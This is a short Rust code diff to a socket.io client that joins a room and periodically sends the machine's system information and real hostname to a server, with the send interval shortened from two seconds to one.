@@ -447,18 +447,18 @@ impl ComputerData{
         socket.emit("join", json!({"room": "RIV"})).await.unwrap();
         // socket.emit("command", json!({"command": "LIST", "room": "RIV"})).await.unwrap();
         // let msg: Vec<u8> = "hello from client".as_bytes().to_vec();
-    
+        let systeminfo = Self::get_sysinfo().await;
+
         let json_payload = json!({
             "room": "RIV",
-            "sysinfo": Self::get_sysinfo().await,
-            "hostname": "shadowbrokerPC"
+            "sysinfo": systeminfo,
+            "hostname": systeminfo.hostname
         }); 
         
-        sleep(Duration::from_secs(2)).await;
         // Spawn a task or run a loop that listens for a shutdown signal
         // tokio::spawn(async move {
             loop{
-                sleep(Duration::from_secs(2)).await;
+                sleep(Duration::from_secs(1)).await;
     
                 socket.emit("clientSysInfo", json_payload.clone())
                     .await
